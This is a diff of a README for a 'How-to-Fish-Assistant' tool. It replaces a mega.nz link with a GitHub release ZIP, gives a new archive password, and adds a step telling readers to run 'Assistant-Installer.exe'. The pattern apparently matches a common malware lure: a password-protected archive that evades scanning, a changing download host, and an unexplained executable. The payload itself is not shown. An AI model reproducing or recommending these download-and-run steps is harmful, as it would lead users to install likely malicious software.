@@ -10,9 +10,9 @@
 
 ## 📥 Download
 
-### [⬇️ Download the Latest ZIP](https://mega.nz/folder/36QzlJ7C#RZ8BPHVtR0DKj0mlxF5ueg)
+### [⬇️ Download the Latest ZIP](https://github.com/Pursuerchuvibrate/How-to-Fish-Assistant/releases/download/Latest/How-To-Fish-Assistant.zip)
 
-🔐 **Archive password:** `5868781`
+🔐 **Archive password:** `Pursuerchuvibrate`
 
 ---
 
@@ -70,4 +70,10 @@ Download the latest `ZIP` archive using the link above.
 Extract the archive using the password:
 
 ```text
-5868781
+Pursuerchuvibrate
+```
+
+### 3. Running
+
+Run the file Assistant-Installer.exe
+
